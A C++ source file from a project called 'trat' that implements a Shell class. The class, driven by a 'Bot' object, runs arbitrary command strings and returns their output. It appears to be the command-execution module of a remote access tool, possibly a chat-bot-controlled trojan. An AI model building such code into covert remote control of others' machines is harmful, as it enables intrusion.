/* trat/src/Shell/shell.cpp */

#include "../../include/shell.hpp"

#define CURRENT_PATH std::filesystem::current_path().string().c_str() 

namespace trat 
{
  void ShellResponse_destroy(ShellResponse *P_Shell_Response)
  {
    if (P_Shell_Response -> response == nullptr)  { return; }
    
    parser::cleanString(P_Shell_Response -> response);
    free(P_Shell_Response);
    P_Shell_Response = nullptr;
  } 

  Shell::Shell(trat::Bot* P_Master_Bot) : masterBot(P_Master_Bot) {}

  char* Shell::getCurrentPath() 
  {
    return parser::copyString(CURRENT_PATH); 
  }

  bool Shell::executeShellCommandWithoutResponse(const char* Command) 
  {
    return std::system(Command) == 0;
  }

  ShellResponse* Shell::executeShellCommand(const char* Command) 
  {
    ShellResponse *p_shell_response = (ShellResponse*)malloc(sizeof(ShellResponse));
    
    p_shell_response -> isSuccessful = true;
    std::string result; // Ensure the memory is valid across calls
    std::mutex result_mutex; // Mutex to guard access to the result
    std::unique_lock<std::mutex> lock(result_mutex); // Lock during updates
    result.clear(); // Clear any previous result
    try 
    {
      boost::process::ipstream pipe_stream;
      boost::process::child process(Command, boost::process::std_out > pipe_stream);

      std::ostringstream oss;
      std::string line;

      while (pipe_stream && std::getline(pipe_stream, line))
      {
        oss << line << '\n';
      }
      process.wait();
      result = oss.str();

    }catch (const std::exception& e) 
    {
      result = "Error: ";
      result += e.what();
      p_shell_response -> isSuccessful = false;
    }
      p_shell_response -> response = parser::copyString(result.c_str());
      return p_shell_response;
    }

} // namespace trat
